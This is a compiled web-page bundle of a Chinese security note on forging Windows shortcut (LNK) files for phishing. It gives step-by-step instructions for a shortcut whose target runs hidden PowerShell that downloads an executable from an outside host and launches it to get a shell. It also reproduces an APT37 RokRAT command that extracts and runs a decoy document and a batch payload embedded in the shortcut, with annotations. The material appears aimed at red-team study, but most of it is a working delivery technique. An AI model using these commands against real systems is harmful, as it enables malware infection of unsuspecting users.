import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as t}from"./app-CFt4SMiv.js";const n={};function l(h,i){return t(),a("div",null,i[0]||(i[0]=[e(`<h1 id="lnk伪造" tabindex="-1"><a class="header-anchor" href="#lnk伪造"><span>LNK伪造</span></a></h1><h2 id="lnk-powershell" tabindex="-1"><a class="header-anchor" href="#lnk-powershell"><span>LNK+Powershell</span></a></h2><blockquote><p><a href="https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA" target="_blank" rel="noopener noreferrer">疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)</a></p><p><a href="https://www.4hou.com/posts/K70x" target="_blank" rel="noopener noreferrer">利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p></blockquote><p>新建一个快捷方式然后修改目标为如下信息:</p><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" data-title="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">C:\\</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Windows</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">System32</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">WindowsPowerShell</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\v1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\powershell.exe [Net.ServicePointManager]::</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">SecurityProtocol</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = [Net.SecurityProtocolType]::Tls12;iwr http://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">100.1.1.131</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">download</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">local</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/Code.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">outfile</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $env</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">TEMP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\Code.exe;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">start</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">process</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $env</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">TEMP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\Code.exe</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261143196.png" alt="image-20240626114316470"></p><p>当受害者点击该快捷方式后则会调起powershell下载恶意程序并执行上线shell</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261144336.png" alt="image-20240626114445251"></p><hr><h2 id="office-ole-lnk" tabindex="-1"><a class="header-anchor" href="#office-ole-lnk"><span>Office OLE + LNK</span></a></h2><blockquote><p><a href="https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD" target="_blank" rel="noopener noreferrer">常见钓鱼招式 - 先知社区 (aliyun.com)</a></p></blockquote><ul><li><a href="https://www.google.com/search?q=Office+OLE+%2B+LNK&amp;sca_esv=93393d72ee4371e2&amp;sxsrf=ADLYWIKiLlirDtoqCKRrQ_Fnz6WimgY8yg%3A1719480748554&amp;ei=rDF9Zoe7IcyA1e8P5ZCjwAI&amp;ved=0ahUKEwiHwdz5vPuGAxVMQPUHHWXICCgQ4dUDCBA&amp;uact=5&amp;oq=Office+OLE+%2B+LNK&amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiEE9mZmljZSBPTEUgKyBMTksyBRAhGJ8FSOEgULkDWNMdcAN4AZABAZgB0AGgAdANqgEGMS4xMS4xuAEDyAEA-AEBmAIPoALGDMICChAAGLADGNYEGEfCAgQQIxgnwgIIEAAYgAQYogTCAgUQIRigAcICCxAAGIAEGJECGIoFwgIFEAAYgATCAgYQABgWGB7CAgoQABgWGAoYHhgPwgIIEAAYFhgeGA_CAggQABgWGAoYHsICCxAAGIAEGIYDGIoFmAMAiAYBkAYFkgcENC4xMaAHmjA&amp;sclient=gws-wiz-serp" target="_blank" rel="noopener noreferrer">Office OLE + LNK - Google Search</a></li><li><a href="https://answers.microsoft.com/en-us/msoffice/forum/all/issues-in-ole-link-from-excel-to-word-for-windows/c93d2e18-8404-4a51-82f4-d3c0da8151da" target="_blank" rel="noopener noreferrer">Issues in OLE link from Excel to Word for Windows - Microsoft Community</a></li><li><a href="https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence" target="_blank" rel="noopener noreferrer">Abusing LNK &quot;Features&quot; for Initial Access and Persistence (v3ded.github.io)</a></li><li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk" target="_blank" rel="noopener noreferrer">Phishing: OLE + LNK | Red Team Notes (ired.team)</a></li></ul><hr><h2 id="apt" tabindex="-1"><a class="header-anchor" href="#apt"><span>APT</span></a></h2><h3 id="rokrat" tabindex="-1"><a class="header-anchor" href="#rokrat"><span>ROKRAT</span></a></h3><blockquote><p><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat" target="_blank" rel="noopener noreferrer">RokRAT（恶意软件家族） --- RokRAT (Malware Family) (fraunhofer.de)</a></p><p><a href="https://www.4hou.com/posts/K70x" target="_blank" rel="noopener noreferrer">利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://starmap.dbappsecurity.com.cn/blog/articles/2023/04/27/apt37-rokrat/" target="_blank" rel="noopener noreferrer">安全星图平台 (dbappsecurity.com.cn)</a></p><p><a href="https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener noreferrer">APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA%3D%3D&amp;mid=2247496455&amp;idx=1&amp;sn=0e3af7d734671a41c9d796e7f33b085d&amp;chksm=f9ed9fb8ce9a16ae8e9714f116e0812994e0e3d13eb75d05182e623372fc5b979d70cf403f39&amp;scene=178&amp;cur_album_id=1375769135073951745" target="_blank" rel="noopener noreferrer">猎影追踪：APT37利用朝鲜政治话题针对韩国的攻击活动分析 (qq.com)</a></p></blockquote><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" data-title="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;C:\\Windows\\SyswOW64\\cmd.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">c</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> powershell</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">windowstyle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> hidden </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> Get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Location</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Match</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> &#39;system32&#39; -or $dirPath -Match &#39;Program Files&#39;) {$dirPath = &#39;C:\\Users\\Admin\\AppData\\Local\\Temp&#39;};$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; $pdfPath = &#39;c:Users\\Admin\\AppData\\Local\\Temp\\230401.hwp&#39;; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">^&amp; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfPath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exeFile </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> gc</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $Lnkpath </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Encoding</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> Byte</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">TotalCount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 00068696</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ReadCount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 00068696</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exePath </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">= </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">&#39;c:/Users/Admin/AppData/Local/Temp/230401.bat&#39;; sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; ^&amp; $exePath;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;C:\\Windows\\SyswOW64\\cmd.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">c powershell </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">windowstyle </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">hidden</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 获取当前路径</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> Get-Location</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 如果当前路径包含system32或者Program Files，则将 dirPtah 设置到临时目录</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -Match</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;system32&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -or</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $dirPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -Match</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Program Files&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) {</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;C:\\Users\\Admin\\AppData\\Local\\Temp&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 获取 dirPath 下文件大小为0x0001DAB452的</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Lnkpath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> Get-Childltem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Path </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$dirPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Recurse </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.lnk ^| </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">where-object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {$_</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">.length</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">eg </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0x0001DAB452</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} ^| </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Select-Object</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ExpandProperty FullName;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Get-Contet 一次性获取 Lnkpath 对应文件开头的 65446 字节 存储到 $pdfFile</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfFile</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> gc </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Lnkpath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding Byte </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">TotalCount </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00065446</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ReadCount </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00065446</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfPath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c:Users\\Admin\\AppData\\Local\\Temp\\230401.hwp&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Set-Content 跳过 $pdfFile 的前 2470 字节将剩余内容 写入到 $pdfPath</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sc </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfPath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ([</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">byte</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]](</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ^| select </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Skip </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">002470</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding Byte; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 运行 $pdfPath</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">^&amp; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pdfPath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 一次性获取 Lnkpath 对应文件开头的 68696 字节 存储到 $exeFile</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exeFile</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> gc </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Lnkpath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding Byte </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">TotalCount </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00068696</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ReadCount </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00068696</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exePath</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c:/Users/Admin/AppData/Local/Temp/230401.bat&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Set-Content 跳过 $exeFile 的前 65446 字节将剩余内容 写入到 $exePath</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sc </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exePath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ([</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">byte</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]](</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exeFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ^| select </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Skip </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00065446</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding Byte; </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 运行 $exePath</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">^&amp; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$exePath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体分析可以参阅 <a href="https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0" target="_blank" rel="noopener noreferrer">APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)</a></p><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2><ul><li><a href="https://www.jianshu.com/p/dcd250593698" target="_blank" rel="noopener noreferrer">钓鱼姿势汇总 - 简书 (jianshu.com)</a></li><li>TODO <ul><li><a href="https://www.cnblogs.com/f-carey/p/16542156.html#tid-eeTEc7" target="_blank" rel="noopener noreferrer">钓鱼攻击之：Lnk 文件钓鱼 - f_carey - 博客园 (cnblogs.com)</a></li></ul></li></ul><hr>`,23)]))}const r=s(n,[["render",l],["__file","index.html.vue"]]),d=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/LNK%E4%BC%AA%E9%80%A0/","title":"LNK伪造","lang":"zh-CN","frontmatter":{"category":["网络安全","网络钓鱼"],"tags":["钓鱼附件","LNK伪造"],"excerpt":"网络钓鱼攻击者可能会伪造 LNK 文件来诱骗用户下载恶意软件或执行恶意命令。LNK 文件可以包含指向恶意网站的链接，或者直接执行恶意代码。","description":"LNK伪造 LNK+Powershell 疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com) 利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com 新建一个快捷方式然后修改目标为如下信息: image-2024062611431647...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/LNK%E4%BC%AA%E9%80%A0/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"LNK伪造"}],["meta",{"property":"og:description","content":"LNK伪造 LNK+Powershell 疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com) 利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com 新建一个快捷方式然后修改目标为如下信息: image-2024062611431647..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202406261143196.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"钓鱼附件"}],["meta",{"property":"article:tag","content":"LNK伪造"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"LNK伪造\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202406261143196.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406261144336.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-06-26T09:13:45.000Z"},"headers":[{"level":2,"title":"LNK+Powershell","slug":"lnk-powershell","link":"#lnk-powershell","children":[]},{"level":2,"title":"Office OLE + LNK","slug":"office-ole-lnk","link":"#office-ole-lnk","children":[]},{"level":2,"title":"APT","slug":"apt","link":"#apt","children":[{"level":3,"title":"ROKRAT","slug":"rokrat","link":"#rokrat","children":[]}]},{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1719393225000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":2,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@gmail.com","commits":3,"url":"https://github.com/233"}]},"readingTime":{"minutes":2.95,"words":884},"filePathRelative":"网络安全/钓鱼/钓鱼附件/LNK伪造/index.md","localizedDate":"2024年6月26日","autoDesc":true}');export{r as comp,d as data};
